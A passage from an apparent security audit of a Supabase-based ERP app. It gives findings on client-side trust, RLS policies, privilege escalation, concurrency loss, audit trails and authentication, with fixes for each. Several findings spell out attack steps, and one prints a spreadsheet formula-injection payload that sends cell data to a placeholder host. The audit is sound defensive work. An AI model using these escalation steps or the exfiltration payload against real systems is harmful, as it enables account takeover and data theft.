strengths: The engine logic is pure and transactional. transact() (store.ts:97-106) runs each action on a structuredClone and commits only if it doesn't throw, so a failed post or payment leaves nothing half-written. The same code could run on a server unchanged.

RLS is enabled on both tables. Policies are scoped `to authenticated`, so anon users get nothing. The helper functions are SECURITY DEFINER with `set search_path = ''`, live in a non-exposed `private` schema, and have execute revoked from anon/public (migrations:26-44). This is the right Supabase pattern and avoids RLS recursion.
Saves use an optimistic version check (store.ts:55-61, `.eq('version', version)`), so a stale client can't silently overwrite a newer row.

Formulas use a tokenizer and recursive-descent parser with no eval or Function (formula.ts:1-56). React escaping is used everywhere, and there is no dangerouslySetInnerHTML or innerHTML anywhere in src/, so the stored-XSS surface is small.

The ledger guardrails are well thought out: balanced-journal assertion (engine.ts:406-412), gapless numbering only after every check passes (engine.ts:450-452), immutable posted documents with void-and-reverse (engine.ts:267, 508-530), and payments capped at the balance (engine.ts:539).
The dependency footprint is minimal (8 runtime deps), `npm audit --omit=dev` reports 0 vulnerabilities, `npx tsc -b` is clean, and 33/33 tests pass in under 1 s.

scorecard.rationale: The foundations are right: RLS on, definer helpers hardened, no eval, React escaping, 0 vulnerable deps, optimistic versioning. But the trust boundary is in the wrong place. Every business rule and permission runs in the browser over one JSON row that any member may overwrite (SECU-01). A member can escalate to DB admin (SECU-02), and role-based view limits are cosmetic (SECU-03). Concurrent saves silently lose posted work (SECU-04), and the audit trail is mutable (SECU-06). Nothing protects against data loss (SECU-08). It is not launchable for real books.

Core single-user flows are verified by 33 passing engine tests: posting, VAT, stock and moving-average cost, void reversal, approvals, import, ageing, and templates generating with zero errors. Multi-user, persistence, permission-denial, RLS and UI journeys are untested (SECU-18), and the sync layer has a permanent-failure bug (SECU-05). Automations depend on someone opening the app (SECU-17).

Builder flexibility is strong and its guardrails (system fields, reference checks, publish validation) are well designed. They are client-side only, though, so the 'without compromising control' half of the promise isn't met until the rules run on the server (SECU-01, SECU-16).

On the platform side (security posture, auditability, scale, uptime and backup), Odoo, BC, NetSuite, Zoho and HubSpot all enforce permissions server-side, keep immutable audit logs, offer MFA and SSO, and page data server-side. Bonyan currently cannot pass a basic enterprise security questionnaire (SECU-10, SECU-11, SECU-13).
Automations are browser-triggered, permission-bypassing and race-prone (SECU-17). There is no run monitor or telemetry for an AI system-diagnosis feature to build on.

vision: In a best-in-class version, the browser is only a view. Every change is a typed server command (post_invoice, register_payment, approve, publish_schema), running the existing pure engine.ts inside a Supabase Edge Function or Postgres RPC, in one ACID transaction. Roles come from workspace_members keyed by auth.uid(), never from client data. Data lives in normalised, indexed tables partitioned by workspace. RLS is enforced per module and per sensitive field (cost and margin visible to finance only). Journal lines, stock moves and the hash-chained audit_events table are insert-only. Invoice numbers come from a locked server sequence with a UNIQUE index, ready for ETA e-invoice submission with the issuer's signing certificate in a KMS. Approvals bind to a content hash with true maker-checker. Every write lands in an immutable audit trail with real actor, on-behalf-of and server time. Owners get an Audit screen and a 'restore to any point in the last 30 days' button backed by PITR and versioned snapshots. Identity matches Microsoft or Zoho: tokenised expiring invites, password reset, TOTP or passkey MFA required for owner and finance, Google and Microsoft SSO, session and device management with remote sign-out, Turnstile on auth, and custom SMTP with DKIM. The edge serves a strict CSP and HSTS, fonts are self-hosted, and the app cannot be framed. Realtime channels show colleagues' changes live, so there are no conflicts and nothing is silently lost. Automations run on pg_cron with idempotency keys and a run monitor. The same telemetry feeds an AI 'system doctor' that flags broken automations, rising error rates, permission drift and unbalanced data, with suggested fixes. CI blocks merges unless tsc, lint, unit coverage, pgTAP RLS attack tests and Playwright multi-user journeys pass. The platform publishes a security page (data residency, PDPL/GDPR DPA, RPO/RTO, pen-test summary) that lets an Egyptian SME and a European buyer sign with confidence.

findings.title: Any workspace member can rewrite the whole company: users, roles, posted invoices, journal, stock and audit log
findings.area: Platform / Supabase RLS / whole-document save model
findings.evidence: supabase/migrations/20261024000000_workspaces.sql:67-70: the UPDATE policy is only `using (private.is_member(id)) with check (private.is_member(id))`. There is no column restriction and no server-side validation of `doc`. store.ts:56-61 sends the entire Workspace JSON (`update({ doc: ws, ... version: version + 1 })`). Every permission check (engine.ts:28-42 can/need, canPost 35-38, posted-doc lock 267/297, stock and journal posting 423-506) runs in the browser on the user's own copy (useApp.ts:34-36). A Sales user with the publishable key from .env and their own JWT can PATCH /rest/v1/workspaces?id=eq.<ws> with any doc. For example they can set their own users[].roleId to 'role_admin' or flip roles[].admin=true, change lines or totals on a posted INV, delete journal rows, reset data.sequences, empty data.activity, or remove other people from ws.users, which locks them out at store.ts:207-208 ('no profile in it yet'). README's guardrail table claims 'Permissions: Enforced in the engine, not only hidden in the UI', but the engine is the client.
findings.impact: None of the guardrails (immutable postings, double entry, finance-only posting, approvals) hold against a member who is malicious or compromised. The books can be falsified without trace. This fails OWASP ASVS V4 (access control enforced at a trusted service layer) and means the product cannot be called audit-grade or ETA-ready. It blocks launch.
findings.recommendation: Make the database the only writer of business state. (1) Revoke UPDATE on public.workspaces from authenticated. (2) Expose a command API as SECURITY DEFINER Postgres RPCs or a Supabase Edge Function running the existing pure engine.ts (post_document, register_payment, void_document, update_record, publish_schema, set_member_role). Each one loads the doc `FOR UPDATE`, resolves the caller's role from workspace_members by auth.uid() (never from the doc), runs the engine, validates, and writes. (3) In the medium term, normalise into tables (records, documents, document_lines, journal_lines, stock_moves, payments) with RLS per module and permission. Journal and stock tables get INSERT-only grants. The user should notice no difference except that 'Post' becomes a server round-trip with a spinner.
findings.auditor: Checked migrations:67-70: the UPDATE policy is member-only, with no column list and no validation of doc. store.ts:56-61 writes the whole Workspace. Every check in engine.ts (can/canPost 28-38, the posted lock at 267/297, postDocument 423-506) runs on the client copy built in useApp.ts:34-36. The doc also holds users[].roleId and published.roles, so a Sales member who PATCHes the row can make themselves in-app admin. App.tsx:26 Guard and engine can() at engine.ts:31 then trust that. Removing a user from ws.users locks them out at store.ts:207-208. The README:57 claim 'Enforced in the engine' is misleading because the engine is the browser. There is one more lever: version is client-supplied (store.ts:58). Effort XL is right.

findings.title: Privilege escalation: a non-admin member can make themselves DB admin by rewriting workspaces.created_by
findings.evidence: migrations:11 `created_by uuid ... default auth.uid()` is an ordinary column. migrations:67-70 lets any member UPDATE any column, including created_by. migrations:77-86 lets anyone insert themselves as is_admin if `w.created_by = auth.uid()`. Attack: member A (Sales) PATCHes workspaces set created_by = <uid of A's second account B>. B signs in and inserts workspace_members(ws, B-email, is_admin=true), which passes the second branch. B is now a DB admin and can promote A, then remove the owner (policies at 88-95). Related problem: migrations:61 gives the creator permanent SELECT, and the creator branch at 82-85 lets an original creator who was removed (for example a departed co-founder) re-add themselves as admin at any time.
findings.impact: Anyone with a member seat can take over the tenant, evict the owner and control membership. That is full account takeover of the company's CRM and books.
findings.recommendation: (a) Add a BEFORE UPDATE trigger that raises if NEW.created_by <> OLD.created_by or NEW.id <> OLD.id, and also `revoke update (created_by, id) on public.workspaces from authenticated`. (b) Delete the creator branch from the INSERT policy. Create workspaces only through a SECURITY DEFINER RPC `create_workspace(name)` that inserts the workspace row and the first owner membership in one transaction. (c) Add an explicit `owner` role in workspace_members that only the owner can transfer. (d) Remove `or created_by = auth.uid()` from the SELECT policy. (e) Add pgTAP tests that run exactly this attack.
findings.auditor: The attack works as described. created_by is an ordinary column (migrations:11), and the UPDATE policy at 67-70 does not stop a member changing it. For account B, the INSERT creator branch at 82-85 passes: the subquery on workspaces is visible to B through the SELECT branch `created_by = auth.uid()` (61), and B's e-mail is not yet in workspace_members, so the PK does not block it. A cannot do this alone because (ws, A-email) already exists and only admins can update or delete member rows. A second account is enough. A creator who was removed can still read the doc (61) and re-add themselves as admin (82-85). Effort S is right.

findings.title: Role 'view' permissions are cosmetic: every member downloads every record, cost, margin and journal line
findings.evidence: store.ts:204-206 selects the full `doc`, which includes all modules' records, data.journal, data.payments, product cost and every user's e-mail, into each member's browser. Filtering happens only in UI components. ModuleView.tsx:23 checks 'view', but RecordPage.tsx:16-22 has no view check at all, so /app/r/<id> opens any record from links in notifications or approvals. relatedRecords (RecordPage.tsx:177-185) lists linked records from modules the role cannot see. Inventory.tsx:7-13 has no permission check and shows stock value at average cost and per-product cost to every role. Anyone can read everything in DevTools: `(await supabase.from('workspaces').select('doc')).data`.
findings.impact: A sales rep leaving for a competitor can export the full customer list, margins, supplier prices and the general ledger in seconds. The Roles & Access matrix the product sells gives a false sense of control. It also conflicts with least-privilege expectations under Egypt PDPL 151/2020 and GDPR for global customers.
findings.recommendation: Server-side read filtering as part of SECU-01: per-module record tables with RLS policies of the form `exists(select 1 from workspace_members m join role_permissions p ... where p.module_id = records.module_id and 'view' = any(p.perms))`. Add field-level security (hide cost and margin from non-finance roles) through views or column grants. In the short term, add the view check to RecordPage, Inventory and related lists so the UI is at least consistent. Log bulk exports (SECU-06).
findings.auditor: store.ts:204-206 loads the entire doc for every member, and RLS gives SELECT on the full row (59-61). RecordPage.tsx:16-22 has no 'view' check. relatedRecords at 177-185 lists records from every module. FieldInput relation options (227-233) list every target record, whatever the module's view right. Inventory.tsx:7-13 shows cost and margin to every role with no check. ModuleView.tsx:23, Shell search (visible modules) and Dashboard.tsx:14/67 do filter by view, so the UI is inconsistent rather than fully open. Root cause is the same as SECU-01; the impact on confidentiality is real.

findings.title: Concurrent edits silently throw away a user's posted invoices, payments and records
findings.evidence: store.ts:68-72: when the version check fails, the client calls reload(ws.id). reload (store.ts:141-148) replaces the local doc and sets dirty=false. Every action the user made since their last successful save is discarded, and the only signal is a small amber 'Reloaded latest' pill (Shell.tsx:87-89). Conflicts are frequent because every session writes on mount: runScheduled at Shell.tsx:23-28 writes workflowRuns and tasks. Opening the bell writes read flags (Shell.tsx:77). Saving a view writes too (ModuleView.tsx:40). Saves are debounced at 600 ms and send the whole doc (store.ts:45). There is no realtime subscription, so nobody sees other people's changes until they collide.
findings.impact: With 3-10 concurrent users, a cashier can register a payment or post an invoice, print it and hand it to the customer, and then see it vanish when a colleague's notification click wins the race. The number is then reissued to someone else, so the printed tax invoice no longer exists in the books. This is data loss and a wrong-books outcome.
findings.recommendation: Short term (M): the engine actions are pure functions, so keep a queue of pending commands, for example {fn:'postDocument', args}. On conflict, reload and re-apply the queue on top of the fresh doc. If a command now fails (stock was consumed), show a blocking dialog that lists exactly what could not be applied. Stop non-essential writes: make notification-read and saved views per-user rows in their own table, and run scheduled automations on the server. Long term (XL): server commands (SECU-01) with row-level transactions, plus Supabase Realtime so lists update live, the way Odoo, HubSpot and Salesforce behave.
findings.auditor: Confirmed, and the panel understated it. On a 0-row update, flush calls reload (store.ts:68-72). reload replaces the doc and sets dirty=false (141-148), which also drops edits made while the await was in flight. transact (store.ts:97-105) always calls update(), and so save(), even when the action changed nothing. As a result, runScheduled on every Shell mount (Shell.tsx:23-28) writes the full doc on each app open, whether or not any automation ran. The bell (Shell.tsx:77) and saveView (ModuleView.tsx:40) are further writers. There is no realtime subscription, so users only learn of each other's changes through collisions. The re-used invoice number scenario holds because nextNumber reads the sequence from the doc (engine.ts:399-404).

findings.title: Save pipeline can die permanently, and sign-out then fails and leaves the session on the device
findings.evidence: store.ts:51 chains saves with `saving = saving.then(async () => {...})`, with no catch. If reload() throws (store.ts:143), for example after a network blip between UPDATE and SELECT, or because the member was removed so RLS returns no row to `.single()`, `saving` becomes a rejected promise. Every later `saving.then(cb)` skips cb, so nothing is ever saved again and the pill stays 'Saving…' forever. signOut (store.ts:258-260) does `await flush()` first, so it rejects before `supabase.auth.signOut()` is called. Shell.tsx:95 uses `void signOut().then(...)`, so the user clicks Sign out and nothing happens, which matters on a shared office PC. In addition, a member removed by an admin gets 0 rows from the UPDATE (store.ts:68), and that is misread as a version conflict.
findings.impact: The user keeps working for hours while nothing persists. A user who tries to sign out stays signed in, with tokens still in localStorage.
findings.recommendation: Wrap the chained body in try/catch so the chain never rejects. Set sync='error' and schedule a retry. In signOut use `try { await flush() } finally { await supabase.auth.signOut(); clear state; localStorage.removeItem(LAST_WS) }`. After a 0-row update, re-select `version` to tell a real conflict apart from lost access, and on lost access show 'Your access to this workspace was removed' and sign out. Add unit tests for store.ts with a mocked Supabase client.
findings.auditor: The mechanics are right. The chain at store.ts:51 has no catch. reload throws at 143, so `saving` is rejected for good, and signOut (258-260) awaits flush before auth.signOut(), so sign-out does nothing (Shell.tsx:95). A member who was removed gets 0 rows, which is misread as a conflict. The triggers are narrow, though: removal (where the user should not be saving anyway) or a network failure exactly inside the conflict path. Normal UPDATE errors already go to the retry path (62-66), and beforeunload warns. The stuck sign-out on a shared PC is the real harm, so medium rather than high. Effort S.

findings.title: The audit trail is mutable, truncated at 500 events, client-timed, and forgeable through 'switch user'
findings.evidence: engine.ts:216-219 log() stores activity inside the doc, records the actor as a display-name string (`user: ctx.user.name`) rather than an id, takes the time from the browser clock (engine.ts:19 nowISO), and truncates to 500 entries workspace-wide. Field history (RecordPage.tsx:52) is therefore lost once the company passes 500 total events. Any member can rewrite or empty it (SECU-01). Impersonation: switchUser (store.ts:267-272) changes session.userId, and useApp.ts:36 builds ctx.user from that id. An admin 'trying the app as' Sara actually creates, posts and approves as Sara: createdBy, log user, approvals.requestedBy/decidedBy (engine.ts:739, 755).
findings.impact: No reliable who/what/when for auditors, the tax authority or internal fraud investigations. ISA 315/IFRS-era audit practice and ETA record retention (5 years) expect immutable logs. An admin can manufacture approvals 'by' a manager.
findings.recommendation: Create a server-side `audit_events` table (workspace_id, actor_uid, on_behalf_of, action, entity, before/after jsonb, at timestamptz default now(), prev_hash, hash). Allow INSERT only from the command RPCs or triggers, and revoke UPDATE/DELETE from everyone. Keep it uncapped and partitioned by month. Make 'View as role' read-only: render with the other role's permissions but block every act() call, or record the actor as the real user with on_behalf_of. Add an Audit screen for owners with filters by user, module and date, plus CSV export.
findings.auditor: engine.ts:216-219 records the actor as a display-name string with browser time and keeps only the last 500 entries. The field history at RecordPage.tsx:52 reads from that capped list. execute() writes 'Automation' entries (669) that also count toward the 500. switchUser (store.ts:267-272) has only a client-side gate on selfUser().roleId. act() builds ctx.user from session.userId (useApp.ts:36), so createdBy, approvals.requestedBy/decidedBy (engine.ts:739, 755) and log entries are written as the person being impersonated. The server keeps no record of who saved: the workspaces table has no updated_by column.

findings.title: Maker-checker approvals can be bypassed by approvers and admins, and validity depends on client clocks
findings.evidence: guardApproval (engine.ts:726-728) returns immediately if the current user canApprove the rule. A Manager (the approver role) can post their own EGP 2M invoice with no approval record at all. The self-approval ban in decideApproval (engine.ts:753) exempts admins. An approval stays valid while `decidedAt >= rec.updatedAt` (engine.ts:720), but both timestamps come from different users' device clocks. If the approver's PC is 1 hour ahead, the requester can raise the invoice total after approval and still post. The approval is not bound to the amount or content.
findings.impact: The segregation-of-duties control marketed as Odoo/ERPNext-grade is not effective. It is exactly the control auditors test first for fraud risk (COSO).
findings.recommendation: Store a content hash on approval (lines, totals, party, date) and re-check that hash at posting instead of comparing timestamps. Require approver ≠ maker for every role. Allow an optional 'Owner override' that demands a reason and is written to the audit log. Server timestamps only. Give each rule a 'maker cannot post their own documents above X' option. Show the user a clear banner, for example 'Approved by Mona for EGP 120,000 — changed since approval, needs re-approval'.
findings.auditor: guardApproval (engine.ts:726-728) returns when canApprove is true. canApprove (709-712) is true for admins and for the approver role, so they post with no approval record. The self-approval ban at 753 exempts admins. Validity compares decidedAt against rec.updatedAt (720), both taken from client clocks; nothing binds the approval to an amount or content hash. Approvals also do not cover void or payments.

findings.title: No backups, no corruption protection, and deleting the owner's login deletes the company
findings.evidence: migrations:11 `created_by ... references auth.users (id) on delete cascade`: deleting the creator's auth user, from the Supabase dashboard or a future 'delete my account', cascades and deletes the workspace and all its books. No CHECK or jsonb schema validation exists on `doc`, and the client trusts it blindly (`data.doc as Workspace` at store.ts:147 and 206, `ws.published as AppSchema` at useApp.ts:32). A single bad write, malicious or buggy, such as `{}`, crashes every member's app (`ws.users.find` on undefined). Only the latest version is kept. There is no history table and no 'download full backup' anywhere in src/. Builder history (Builder.tsx:62-63) keeps schemas only, not data.
findings.impact: Unrecoverable loss of a company's ledger from one click or one bug. On the Supabase free tier there is no PITR. Enterprise buyers will ask for an RPO/RTO answer and there isn't one.
findings.recommendation: Change to `on delete restrict` and add an explicit ownership-transfer flow. Add a `workspace_versions` table filled by an AFTER UPDATE trigger: keep every version for 30 days, then daily snapshots, insert-only. Validate doc shape at the boundary with pg_jsonschema in a CHECK, and with zod in the client before use. Add an owner-only 'Download full backup (JSON + CSV per module)' button and a 'Restore to yesterday 18:00' screen. Enable PITR on the production project and document RPO ≤ 5 min and RTO ≤ 1 h.
findings.auditor: `on delete cascade` on created_by (migrations:11) and onward to workspace_members (17) is real. The doc is used with unchecked casts (store.ts:147, 206; useApp.ts:32), so a malformed doc breaks every client. There is no version history table and no export or backup feature in src. One correction: Supabase paid plans take platform daily backups (and PITR as an add-on). The real gap is that the app offers nothing, the repo documents no RPO/RTO, and restore means the whole project, not one tenant.

findings.title: Membership is bound to a bare e-mail string: pending invites can be claimed, and security depends on a dashboard toggle
findings.evidence: private.auth_email() (migrations:27-30) reads `auth.jwt() ->> 'email'`, and is_member (32-35) matches it to workspace_members.email. Team.tsx:16-29 adds an e-mail and tells the person to sign up at /join. There is no invite token, no expiry and no binding to a user id. Safety relies entirely on 'Confirm email' being on in the Supabase dashboard (README: 'Keep Confirm email on'), which is neither enforced nor tested in code. If anonymous sign-ins or an OAuth provider with unverified e-mail are ever enabled, those users become `authenticated`. They could then create workspaces (insert policy migrations:63-65) or match invites. The column constraint (migrations:18) also allows '' as an e-mail, which `coalesce(..., '')` would match for e-mail-less users.
findings.impact: Anyone who registers first with an invited address, or a takeover of a mistyped invite, lands inside the company's books. A future configuration change silently opens the door.
findings.recommendation: Add an `invitations` table (id, workspace_id, email, role, token_hash, expires_at, accepted_by uuid). The /join?token= link is sent by e-mail, and acceptance runs through an RPC that checks auth.users.email_confirmed_at is not null, then writes workspace_members.user_id = auth.uid(). Policies then key on user_id, not e-mail. Add `and coalesce((auth.jwt()->>'is_anonymous')::boolean,false) = false` to all policies, and add CHECK (email ~ '^[^@\s]+@[^@\s]+$'). Show the user a 'Pending invite, expires in 7 days, resend/revoke' list on the Team page.
findings.auditor: is_member matches on the JWT e-mail claim (migrations:27-35), and the invite has no token, no expiry and no user-id binding (Team.tsx:16-29). The claim that anyone can claim a pending invite by registering first is wrong while Confirm email is on: the attacker would need the invitee's mailbox. The real risks are: (a) everything rests on a dashboard toggle that the code never checks (README:85); if it is turned off, signUp returns a session and pending invites are taken over instantly; (b) mistyped addresses; (c) the e-mail column accepts '' (migrations:18) and auth_email() coalesces to '', although the Team form's type=email makes that unlikely. Anonymous sign-ins mainly allow workspace spam (63-65), not access to other tenants.

findings.title: No security headers or CSP, session tokens in localStorage, and clickjackable Post/Void buttons
findings.evidence: vercel.json:1-6 contains only build settings and an SPA rewrite: no Content-Security-Policy, X-Frame-Options/frame-ancestors, Referrer-Policy, Permissions-Policy or X-Content-Type-Options. supabase.ts:7 `createClient(url, key)` uses the default localStorage session, so access and refresh tokens are readable by any injected script. index.html loads Google Fonts from a third party, which leaks user IPs and adds an external dependency. Destructive one-click actions (Post RecordPage.tsx:80, Void 86) can be framed.
findings.impact: Any future XSS or compromised npm package gets long-lived refresh tokens for the company's ledger. Clickjacking can trick an admin into posting or voiding. This fails ASVS V14.4 and most enterprise security questionnaires.
findings.recommendation: Add a `headers` block in vercel.json: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self' https://npnhoywlxidojqoijqdu.supabase.co wss://npnhoywlxidojqoijqdu.supabase.co; img-src 'self' data:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'`, plus `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Content-Type-Options: nosniff` and `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Self-host the Cairo and Inter fonts. Shorten the JWT expiry to 15 min and enable refresh-token rotation and reuse detection in Supabase Auth.
findings.auditor: vercel.json:1-6 sets no security headers, and index.html:8-9 loads Google Fonts from a third party. Both are confirmed. localStorage sessions (supabase.ts:7) are supabase-js's standard behaviour for a pure SPA; httpOnly cookies would need an SSR or BFF layer, so this adds risk mainly once XSS exists. No XSS sink was found (no dangerouslySetInnerHTML or innerHTML in src, and formula.ts parses rather than evals). Void is behind a confirm() dialog (RecordPage.tsx:86), which makes clickjacking harder; Post at line 80 is one click. Missing CSP and frame-ancestors is a real hardening gap, but medium, not high. Effort S.

findings.title: Authentication is MVP-grade: no password reset, no MFA, client-only password policy, account enumeration, built-in SMTP limits
findings.evidence: Auth.tsx:7-89 has register, sign-in and join, but no 'Forgot password' flow (no resetPasswordForEmail anywhere in src). The 8-character rule is only in the client (Auth.tsx:24), while the Supabase default is 6. There is no MFA (no supabase.auth.mfa usage) for admin or finance roles. There is no idle timeout or onAuthStateChange listener, so a sign-out or expiry in another tab isn't reflected. store.ts:136 and 236 tell an unauthenticated visitor 'An account with this e-mail already exists', which allows enumeration. Confirmation e-mails rely on Supabase's built-in SMTP, which is rate-limited to a few e-mails per hour and meant for testing only.
findings.impact: Users who forget a password are locked out with no self-service, which drives support load. Finance logins are protected only by a password. At launch, sign-up confirmations stall after a few registrations.
findings.recommendation: Add a 'Forgot password?' link, a reset page and a 'Change password' page. Enforce the policy server-side (Auth → Passwords: minimum 10, leaked-password protection on). Offer TOTP MFA, required for owner, admin and finance roles, with a per-workspace 'Require 2FA for everyone' switch. Add a 30-minute idle lock (configurable) and onAuthStateChange handling. Use generic messages ('If this e-mail can register, we sent a link'). Configure custom SMTP (SES, Resend or Postmark) with SPF/DKIM on the bonyan domain. Add CAPTCHA (Turnstile) on sign-up and sign-in.
findings.auditor: There is no resetPasswordForEmail, mfa or onAuthStateChange anywhere in src. The 8-character rule is client-only (Auth.tsx:24). On enumeration: Supabase deliberately returns a user with empty identities for existing e-mails to hide them, and store.ts:236 undoes that by telling the visitor the account exists. The SMTP limit is a configuration issue, not code, but it is valid for launch. Missing password reset alone blocks launch for real customers.

findings.title: Unbounded resource use: unlimited workspaces, unlimited document size, whole-file CSV import, whole-doc uploads
findings.evidence: The INSERT policy (migrations:63-65) lets any signed-in user create unlimited workspace rows. Neither `doc` nor `name` has a size constraint. ImportModal.tsx:46-48 reads the entire file into memory (`file.text()`) and importRows (engine.ts:785-807) has no row cap, so a 100 MB CSV freezes the tab and then bloats the doc. Every change uploads the full document (store.ts:58), and each jsonb update rewrites the whole TOASTed row and its WAL. Builder keeps 20 full schema snapshots inside the same doc (Builder.tsx:62-63). Activity, journal, stock and payments grow inside it too.
findings.impact: Cost-based DoS on the Supabase project, a slow app for growing customers, and eventually PostgREST or edge payload limits causing save errors. Those errors loop retrying every 5 s (store.ts:62-66).
findings.recommendation: Create workspaces only through an RPC with a per-user limit (for example 3 per day) and CAPTCHA. Add `check (pg_column_size(doc) < 5_000_000)` as a stopgap, and show a 'Workspace size' meter in Settings. Cap imports (for example 10k rows or 10 MB) with a progress bar and chunked server-side import. Move builder history and activity into their own tables. Send JSON patches or server commands instead of the whole doc.
findings.auditor: The INSERT policy (migrations:63-65) has no limit, and doc and name have no size constraint. ImportModal.tsx:46-48 calls file.text() on the whole file, and importRows (engine.ts:785-807) has no row cap. Every save uploads the full doc (store.ts:58). Builder history keeps 20 full schemas (Builder.tsx:62-63). notes, stock, journal and payments grow without bound inside the doc. Errors retry every 5 s (store.ts:62-66).

findings.title: The single-document, all-in-browser architecture reaches its ceiling at a few thousand records
findings.evidence: findRecord (engine.ts:50-57) linearly scans every module's records and is called for every relation cell through recordTitle and displayValue (engine.ts:59-68, 83-84), every relation option list (RecordPage.tsx:228-233) and every sort (ModuleView.tsx:44-54). referencesTo (engine.ts:282-292) and relatedRecords (RecordPage.tsx:177-185) scan the whole dataset on each render. Rollups (engine.ts:136-141) filter full lists per row. Lists have no pagination. Every member downloads the entire company at sign-in (store.ts:204).
findings.impact: A distributor with 20k invoices and 5k products sees O(n²) renders, multi-second lag and multi-MB sign-ins. Odoo, BC, NetSuite and Zoho all page and query server-side, so this can't compete with them at scale.
findings.recommendation: Target data model: workspaces → modules → records (id, workspace_id, module_id, values jsonb, stage, status, number, created_by, updated_at), with GIN indexes on values and btree on (workspace_id, module_id, updated_at). Add document_lines, journal_entries/journal_lines (append-only), stock_moves and payments. Use server-side pagination, filtering and search (pg_trgm), and precomputed rollups through triggers or materialised views. Keep engine.ts as the shared rules library and run it in an Edge Function. Use Realtime channels per module. Migrate with a one-time job that explodes each doc into rows.
findings.auditor: findRecord (engine.ts:50-57) scans every module linearly, and recordTitle/displayValue call it per cell. The ModuleView sort calls fieldValue per comparison (ModuleView.tsx:48-58). referencesTo (282-292) and relatedRecords run full scans. Tables are not paginated. This is a scaling and competitiveness issue, not a security one, but the rating is fair.

findings.title: Gapless tax-invoice numbering is client-controlled and can be reset or duplicated
findings.evidence: engine.ts:399-404 increments `ctx.ws.data.sequences[key]` in the client copy. Because of SECU-01, any member can set sequences['INV-2026'] back to 0 and the next posting reissues INV-2026-0001. No database UNIQUE constraint exists on document numbers. Under SECU-04, the loser's posted number is discarded and reassigned, so a printed number can belong to two different invoices.
findings.impact: Duplicate or reused tax invoice numbers violate Egyptian ETA e-invoice rules (unique internal ID per issuer) and IFRS-era audit expectations of sequential, unbroken numbering.
findings.recommendation: Use a server `document_sequences(workspace_id, prefix, year, last)` row, incremented with `UPDATE ... RETURNING` inside the posting transaction. Add a UNIQUE (workspace_id, module_id, number) index on documents. Store a void as a status, never as a deletion. Show the user that the number is assigned only when the server confirms the post.
findings.auditor: nextNumber (engine.ts:399-404) increments a counter inside the doc, and no DB uniqueness exists. This follows from SECU-01 and SECU-04 rather than standing alone, but the ETA consequence (duplicate internal IDs) is real. The year in the number also comes from the user-entered document date (452), so a back-dated invoice draws from a previous year's sequence (see missed item SECU-M2).

findings.title: CSV export is open to spreadsheet formula injection
findings.evidence: ModuleView.tsx:61-69 wraps each cell in quotes and doubles quotes, but does not neutralise cells starting with =, +, -, @, tab or CR. Text fields (engine.ts:849-850 `default: return raw`) and imported CSV values are stored verbatim. A lead named `=HYPERLINK("http://x/?"&A1,"Click")` or a DDE payload runs when finance opens the export in Excel.
findings.impact: Data exfiltration or phishing against the people who export the most (owners and accountants). This is an OWASP-listed injection class.
findings.recommendation: In exportCsv, prefix any cell matching /^[=+\-@\t\r]/ with a single quote. Offer a native .xlsx export (SheetJS) where cells are typed. Optionally warn on import when a value starts with '='.
findings.auditor: exportCsv (ModuleView.tsx:60-69) escapes quotes but does not neutralise leading = + - @ tab or CR. Text values are stored verbatim (engine.ts:849-850). Rated low rather than medium: current Excel warns on DDE and blocks external links by default, and exploiting it takes a member, who already has read access to everything (SECU-03). Fix is S.

findings.title: DB admin flag and in-app admin role disagree, and nothing in the DB protects the last owner
findings.evidence: Three different notions of admin exist. App.tsx:26 Guard checks `user.roleId === 'role_admin'`. Team.tsx:13 and engine.ts:31 check `role.admin`. The DB checks `workspace_members.is_admin`. Team.tsx:32-35 syncs is_admin only when moving to or from the literal 'role_admin' id, so a custom role with admin:true can open Team but every DB write fails, and a demoted admin keeps DB admin. The UI stops only the last-admin dropdown (Team.tsx:66). The DB lets any admin demote or remove every other admin, including the creator (migrations:88-95), with no owner concept.
findings.impact: Confusing permission errors, orphaned admin rights after demotions, and a malicious admin can evict the owner.
findings.recommendation: Use a single source of truth: workspace_members(user_id, role_id, is_owner). Read the role from there and never from the doc. Add a trigger enforcing exactly one owner and at least one admin. The owner can only be changed through an explicit transfer with re-authentication. On the Team page, show an 'Owner' badge and a 'Transfer ownership' dialog.
findings.auditor: There are three notions of admin. Guard checks roleId === 'role_admin' (App.tsx:26). Team.tsx:13 and engine.ts:31 check role.admin. The DB uses is_admin. Team.tsx:32-35 syncs is_admin only when the role id is literally 'role_admin', and skips demo users. The UI disables the last-admin dropdown (Team.tsx:66), but the DB policies at 88-95 allow any admin to demote or remove any other admin, including the creator.

findings.title: Automations run in whichever browser happens to open the app, bypass permissions, and race each other
findings.evidence: Shell.tsx:23-28 calls runScheduled on each Shell mount for every user. execute (engine.ts:648-670) creates records with `{ silent: true }` (655, 703), which skips need() checks, under the opening user's ctx. Date-based automations therefore fire only when someone logs in, attributed to that user. workflowRuns dedup lives in the doc (engine.ts:681-684). Two people opening at 9:00 both run the same automations, and one of them gets discarded through SECU-04.
findings.impact: Overdue-collection tasks and reminders aren't reliable (nothing runs over a weekend). The audit shows a sales rep 'creating' tasks they have no right to create. Automation can't be trusted as a control, which matters for criterion 11's AI and automation goals.
findings.recommendation: Move scheduling to pg_cron plus an Edge Function that runs with a service identity, actor 'Automation', with idempotency keys (workflow_id, record_id, date) in a UNIQUE table. Keep event automations inside the server command transaction. Add an 'Automation runs' monitor: last run, successes, failures and why. AI diagnosis can later be built on that monitor.
findings.auditor: runScheduled runs on every Shell mount (Shell.tsx:23-28) under the opening user's ctx. execute creates tasks with silent:true (engine.ts:655, 703), which skips need(). Deduplication lives in the doc (681-684), so two concurrent sessions race and one write is dropped under SECU-04. The panel also missed that set_field (656-661) bypasses permissions and the posted-document lock (see missed item SECU-M1).

findings.title: Verification coverage is narrow: only the engine is tested, with no RLS, store, permission-denial, e2e tests or CI
